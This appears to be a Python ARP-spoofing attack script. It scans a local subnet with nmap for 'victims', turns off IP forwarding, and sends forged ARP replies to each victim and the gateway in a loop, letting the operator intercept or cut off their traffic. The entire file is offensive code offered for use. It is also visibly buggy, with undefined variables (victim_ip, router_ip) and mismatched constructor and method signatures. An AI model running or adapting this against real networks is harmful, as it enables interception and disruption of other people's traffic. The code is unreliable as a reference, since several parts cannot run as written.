#!/usr/bin/python3


import re
import os
import sys
import time
import nmap3
import socket
import threading

from subprocess import Popen, PIPE


subnet = "192.168.1.0/24"  # Subnet your local network

interface = sys.argv[1]  # Attacker interface
gateway_ip = sys.argv[2]  # Gateway IP-address

mac = None  # Attacker MAC-address

victims = []  # List of victims in local network
threads = []  # List of active threads

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))


class attackThread(threading.Thread):
	def __init__(self, gateway, victim, mac, connect):
		threading.Thread.__init__(self)
		self.victim = victim
		self.gateway = gateway
		self.mac = mac
		self.connect = connect

		# Other
		self.arp = b'\x08\x06'  # Code ARP protocol
		self.protocol = b'\x00\x01\x08\x00\x06\x04\x00\x02'  # ARP packet

	def run(self):
		victim_mac = self.get_mac(self.victim).encode()
		gateway_mac = self.get_mac(self.gateway).encode()

		epacket1 = victim_mac + self.mac + self.arp
		epacket2 = gateway_mac + self.mac + self.arp

		gip = socket.inet_aton(gateway_ip)
		vip = socket.inet_aton(victim_ip)

		victim_arp = epacket1 + self.protocol + mac + gip + victim_mac + vip
		gateway_arp = epacket2 + self.protocol + mac + vip + gateway_mac + gip

		while True:
			self.connect.send(victim_arp)
			print(" Packet send to " + victim_ip)
			self.connect.send(gateway_arp)
			print(" Packet send to " + gateway_ip)
			time.sleep(1)
		

	def get_mac(local_ip):
		pid = Popen(["arp", "-n", local_ip], stdout=PIPE)
		s = pid.communicate()[0]
		mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]

		return mac


def attack(ips):
	for ip in ips:
		threads.append(attackThread(gateway_ip, ip, mac.encode()))

	for th in threads:
		th.start()


def main():
	if interface in get_interfaces():
		mac = get_mac(interface)
		s.bind((interface, socket.htons(0x0800)))

	else:
		print(f"Interface {interface} not found.")
		raise KeyboardInterrupt

	print("Setting IP forward on your PC..")
	disable_ip_forward()

	try:
		victims.append(sys.argv[3])

		nmap = nmap3.NmapHostDiscovery()
		result = nmap.nmap_no_portscan(sys.argv[3])

		if len(result["hosts"]) > 0:
			print("The only victim exposed", sys.argv[3])
		else:
			print("Host " + sys.argv[3] + " not found.")
			raise KeyboardInterrupt

	except IndexError:
		print("Scanning computers in local network..")
		scanner(subnet)

	print("Running the attack..")
	attack(victims)


# Network methods

def disable_ip_forward():
	os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")


def scanner(ip):
	global victims

	nmap = nmap3.NmapHostDiscovery()
	victims = nmap.nmap_no_portscan(ip)["hosts"]
	result = []

	print("")
	for element in victims:
		addr = element["addr"]
		if addr != router_ip:
			result.append(addr)
			print(" -- " + addr)

	if len(result) < 1:
		print("No computers were found on the local network, try again.")
		raise SystemExit
	else:
		print("")
		answer = input("Continue? [Y/n] ")

		if answer.lower() != 'y':
			raise SystemExit

	victims = result
	return victims


def get_mac(interface):
    mac_address = open(f"/sys/class/net/{interface}/address").readline()
    return mac_address


def get_interfaces():
	interfaces = os.listdir("/sys/class/net/")
	return interfaces


if __name__== "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Attack was stopped.")